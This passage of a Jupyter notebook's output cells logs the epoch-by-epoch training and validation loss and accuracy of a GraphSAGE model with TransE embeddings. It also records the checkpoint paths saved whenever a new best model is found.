     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:38:30 | INFO | Epoch 0 | Train Loss: 1.6881 | Train Accuracy: 0.6396\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2a4642888bb04ddda182d426bbdf0584",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:38:31 | INFO | Validation Loss: 1.2440 | Validation Accuracy: 0.6240\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_0_loss_1.2440_acc_0.6240\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2f610b894c4844cd9dcec0136542bd45",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:38:46 | INFO | Epoch 1 | Train Loss: 1.1128 | Train Accuracy: 0.7734\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6429f97304134128b784d4d492939c19",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:38:48 | INFO | Validation Loss: 1.0612 | Validation Accuracy: 0.8120\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_1_loss_1.0612_acc_0.8120\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "02b4428cdaa94a99aacabf89aebd9d1d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:39:01 | INFO | Epoch 2 | Train Loss: 0.9741 | Train Accuracy: 0.8098\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9c6b94ff291b4b8699a1db894bea64ae",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:39:03 | INFO | Validation Loss: 0.8584 | Validation Accuracy: 0.8380\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_2_loss_0.8584_acc_0.8380\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9ec3812841144c3493a75ee724e64783",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:39:14 | INFO | Epoch 3 | Train Loss: 0.8898 | Train Accuracy: 0.8274\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1ffe7c41e2254d17b44df7b780697d84",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:39:16 | INFO | Validation Loss: 1.0890 | Validation Accuracy: 0.8081\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2ba1edecf733417dabfabb374b7764ef",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:39:28 | INFO | Epoch 4 | Train Loss: 0.8698 | Train Accuracy: 0.8336\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dd6feeb9ea3e4079bc5c7cddb76dbef4",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:39:30 | INFO | Validation Loss: 0.8026 | Validation Accuracy: 0.8691\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_4_loss_0.8026_acc_0.8691\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8a9a9ba1ec2540dea77878c122c635e1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:39:42 | INFO | Epoch 5 | Train Loss: 0.8256 | Train Accuracy: 0.8424\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e532809fb0ce4b0fa651f934c937e403",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:39:44 | INFO | Validation Loss: 0.8402 | Validation Accuracy: 0.8440\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fc04a8165f4449e1959963f8d6b36e96",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:39:55 | INFO | Epoch 6 | Train Loss: 0.7817 | Train Accuracy: 0.8449\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "dfbc0eb7bf5c469fab149f8cb9cc9be5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:39:57 | INFO | Validation Loss: 0.7304 | Validation Accuracy: 0.8710\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_6_loss_0.7304_acc_0.8710\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "72d6e7282805421dafbcd97b289ad7aa",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:40:08 | INFO | Epoch 7 | Train Loss: 0.7854 | Train Accuracy: 0.8456\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "364424ca06a64e45af238743e4b39f15",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:40:10 | INFO | Validation Loss: 0.9601 | Validation Accuracy: 0.8159\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2a5c81601f9e4c3b88ff3c348ad05db8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:40:23 | INFO | Epoch 8 | Train Loss: 0.7615 | Train Accuracy: 0.8474\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "35d9f24c6aca47d68985af8d1824f6ec",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:40:24 | INFO | Validation Loss: 0.8152 | Validation Accuracy: 0.8532\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f9251af39dd940249186f16e28f5d330",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:40:36 | INFO | Epoch 9 | Train Loss: 0.7532 | Train Accuracy: 0.8507\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "49f4078ca26f48db8079da38ba832333",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:40:37 | INFO | Validation Loss: 0.8112 | Validation Accuracy: 0.8452\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9f04409a7e4b4c8f819b63e83b93fc4c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:40:49 | INFO | Epoch 10 | Train Loss: 0.7540 | Train Accuracy: 0.8439\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e4a404c86c964f208baa350e5822f94e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:40:50 | INFO | Validation Loss: 0.7479 | Validation Accuracy: 0.8534\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "10c311ad71da4d308a8d5c4ba090a736",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:41:02 | INFO | Epoch 11 | Train Loss: 0.7768 | Train Accuracy: 0.8380\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "51af5b8400764d818a712893e1425645",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:41:04 | INFO | Validation Loss: 0.7369 | Validation Accuracy: 0.8561\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "17821854ff10489093200869a95ae76f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:41:15 | INFO | Epoch 12 | Train Loss: 0.7639 | Train Accuracy: 0.8387\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "e3c3ca91cb064fd6bd8942980e4e99fd",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:41:16 | INFO | Validation Loss: 0.8503 | Validation Accuracy: 0.8332\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "63d1cd835a1249ff8db040599858c83d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:41:28 | INFO | Epoch 13 | Train Loss: 0.7081 | Train Accuracy: 0.8517\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d962705af09f48d295997432cef20266",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:41:29 | INFO | Validation Loss: 0.8701 | Validation Accuracy: 0.8246\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "cf7b2d8bf1584a56a1d78f9236816ab7",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:41:41 | INFO | Epoch 14 | Train Loss: 0.7249 | Train Accuracy: 0.8478\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2ae08e635c614d53b131e5a5f9639e91",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:41:42 | INFO | Validation Loss: 0.8387 | Validation Accuracy: 0.8297\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "79ea0c2c3e8e492c9c974e7e68af2b6f",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:41:56 | INFO | Epoch 15 | Train Loss: 0.7165 | Train Accuracy: 0.8476\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0fa7de7d7a1f4d8c9b12ec76a373de46",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:41:58 | INFO | Validation Loss: 0.7592 | Validation Accuracy: 0.8409\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "c1aef4b3c2f848cba7a68f53d578cc45",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:42:10 | INFO | Epoch 16 | Train Loss: 0.7319 | Train Accuracy: 0.8457\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "75e76e12519944669059d3b9d5d0e2a0",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:42:12 | INFO | Validation Loss: 0.8188 | Validation Accuracy: 0.8260\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "fb99df6fcac14f60b35087e3aeac0298",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:42:25 | INFO | Epoch 17 | Train Loss: 0.7198 | Train Accuracy: 0.8461\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7f9dadf7ce1542ddb6002d0632d52201",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:42:26 | INFO | Validation Loss: 0.7874 | Validation Accuracy: 0.8459\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "3536063f874547b8b46c72de10af5a5c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:42:40 | INFO | Epoch 18 | Train Loss: 0.7223 | Train Accuracy: 0.8453\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "df0d3c405dc443dca59cbf668ec52625",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:42:42 | INFO | Validation Loss: 0.7335 | Validation Accuracy: 0.8580\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2c761ced54dd4a76b386e7e47247184d",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:42:54 | INFO | Epoch 19 | Train Loss: 0.7340 | Train Accuracy: 0.8438\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "933434f5952c468d966b10ef69d85057",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:42:56 | INFO | Validation Loss: 0.7455 | Validation Accuracy: 0.8440\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "b568a8ae1ef0483fade2cdec0408b223",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:43:08 | INFO | Epoch 20 | Train Loss: 0.7124 | Train Accuracy: 0.8514\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "06c8ffb89eca4ebd8e6091172e228143",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:43:09 | INFO | Validation Loss: 0.7567 | Validation Accuracy: 0.8503\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f50d74bd60e6407d94b08d598f850f3a",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:43:25 | INFO | Epoch 21 | Train Loss: 0.7295 | Train Accuracy: 0.8450\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "0595c8cbd32746508a5d1a2af42759ca",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:43:27 | INFO | Validation Loss: 0.7211 | Validation Accuracy: 0.8496\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_21_loss_0.7211_acc_0.8496\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6efd2c30010b4887a876728a5055e1f6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:43:40 | INFO | Epoch 22 | Train Loss: 0.7398 | Train Accuracy: 0.8440\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "94aa0cd16f8e411180293ffa556a66e6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:43:41 | INFO | Validation Loss: 0.8011 | Validation Accuracy: 0.8405\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7b52645e15fa46aca14253c22e2d1f9e",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:43:56 | INFO | Epoch 23 | Train Loss: 0.7145 | Train Accuracy: 0.8485\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "7f0dad7dd5ec4604899d61e686c2fad8",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:43:58 | INFO | Validation Loss: 0.7166 | Validation Accuracy: 0.8594\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_23_loss_0.7166_acc_0.8594\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2ad329a91b3448628c02843b2a97e86c",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:44:12 | INFO | Epoch 24 | Train Loss: 0.7309 | Train Accuracy: 0.8469\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "24b186e171fa4d2699eeb3ab504d78c6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:44:13 | INFO | Validation Loss: 0.7432 | Validation Accuracy: 0.8566\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "4c91c2278d9b4ed2b00f46cf2e89c192",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:44:28 | INFO | Epoch 25 | Train Loss: 0.7168 | Train Accuracy: 0.8447\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "8a31e42fe6c948d6a7bca180ca2fc674",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:44:30 | INFO | Validation Loss: 0.7144 | Validation Accuracy: 0.8518\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_25_loss_0.7144_acc_0.8518\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "6479fff915554374bfc7d20a84331af5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:44:44 | INFO | Epoch 26 | Train Loss: 0.7232 | Train Accuracy: 0.8420\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "1169e57e1cb04b75a1c74e4414e678e3",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:44:45 | INFO | Validation Loss: 0.7598 | Validation Accuracy: 0.8522\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "30ff8fe1aee54cf3aa7c29c7db4f0fa2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:44:59 | INFO | Epoch 27 | Train Loss: 0.7285 | Train Accuracy: 0.8444\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "43ac674811674019a0fe644c6489d2ea",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:45:01 | INFO | Validation Loss: 0.8548 | Validation Accuracy: 0.8274\n",
      "\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f90b8507d60842cda2e843f215b3cf13",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/418 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:45:16 | INFO | Epoch 28 | Train Loss: 0.7213 | Train Accuracy: 0.8469\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "28135b3928744cd2a7d59e4074109736",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/53 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "2024-01-30 22:45:18 | INFO | Validation Loss: 0.6883 | Validation Accuracy: 0.8589\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Best Model Found!!  ./model/GraphSAGE_transE_50/epoch_28_loss_0.6883_acc_0.8589\n"
     ]
    },
    {
